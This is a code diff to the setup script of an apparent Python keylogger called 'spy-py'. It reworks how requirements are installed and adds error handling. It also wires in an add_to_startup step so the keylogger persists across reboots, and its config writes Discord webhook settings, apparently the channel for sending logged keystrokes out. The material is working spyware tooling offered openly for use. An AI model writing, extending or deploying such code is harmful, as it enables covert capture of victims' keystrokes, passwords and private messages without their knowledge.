@@ -13,11 +13,20 @@ try:
 except ImportError:
     pass
 
+
 def install_requirements():
-    with open('requirements.txt', 'r') as f:
+    with open("requirements.txt", "r") as f:
         requirements = f.read().splitlines()
     for requirement in requirements:
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', requirement])
+        result = subprocess.run(
+            [sys.executable, "-m", "pip", "install", requirement],
+            capture_output=True,
+            text=True,
+        )
+        if result.returncode != 0:
+            print(f"Error installing {requirement}: {result.stderr}")
+        else:
+            print(result.stdout)
 
 
 def add_to_startup():
@@ -51,8 +60,24 @@ def add_to_startup():
 
 
 def main():
-    add_to_startup()
-
+    try:
+        print("Installing requirements...")
+        install_requirements()
+        print("Requirements installed successfully.")
+    except Exception as e:
+        print(f"Error installing requirements: {e}")
+        print(
+            "Please install the requirements manually by running 'pip install -r requirements.txt'."
+        )
+        pass
+    try:
+        print("Adding to startup...")
+        add_to_startup()
+        print(
+            "Added to startup. Please restart your system to start the keylogger and make sure it is working as expected."
+        )
+    except Exception as e:
+        print("Error adding to startup: {e}")
     config_values = {
         "LOG_DIRECTORY_PATH": input(
             "Enter the log directory path (hit enter for default path): "
@@ -127,6 +152,7 @@ def main():
             'DISCORD_WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140"\n'
         )
         configfile.write('DISCORD_WEBHOOK_USERNAME = "spy-py"\n')
+        print("Setup completed successfully.")
 
 
 if __name__ == "__main__":
